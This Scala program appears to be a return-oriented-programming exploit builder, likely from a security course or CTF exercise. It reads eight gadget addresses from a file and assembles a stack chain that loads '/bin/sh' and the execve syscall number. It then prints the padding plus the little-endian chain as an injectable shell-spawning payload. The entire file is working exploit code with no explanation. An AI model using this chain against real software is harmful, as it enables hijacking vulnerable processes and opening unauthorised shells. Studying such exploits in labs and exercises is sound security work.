package ROP
import scala.io.Source

object GadgetChainBuilder {

  def main(args: Array[String]): Unit = {
    val filename: String = args(0)
    // val outfile: String = args(1)

    val addresses = new Array[Long](8)
    val chain = new Array[Long](16)

    var i: Int = 0
    for (line <- Source.fromFile(filename).getLines) {
      addresses(i) = java.lang.Long.parseLong(line.toUpperCase, 16)
      i += 1;
    }

    chain(0) = addresses(1)       // 0
    chain(1) = addresses(2)       // 4
    chain(2) = 185273099          // 8
    chain(3) = addresses(0) + 28  // 12
    chain(4) = addresses(3)       // 16
    chain(5) = addresses(4)       // 20
    chain(6) = addresses(5)       // 24
    chain(7) = addresses(0) + 56  // 28
    chain(8) = addresses(6)       // 32
    chain(9) = addresses(0) + 48  // 36
    chain(10) = addresses(0) + 52 // 40
    chain(11) = addresses(7)      // 44
    chain(12) = addresses(0) + 56 // 48
    chain(13) = addresses(0) + 63 // 52 Points at 0 in /sh/0
    chain(14) = 1852400175        // 56 "/bin"
    chain(15) = 6845231           // 60 "/sh/0"

    for (i <- 0 until 8)
      print(s"\\x42")

    for (gadget <- chain) {
      val hex = String.format("%08x", gadget)

      for (i <- hex.length - 1 to 0 by -2)
        print(s"\\x${hex(i - 1)}${hex(i)}")
    }
  }
}
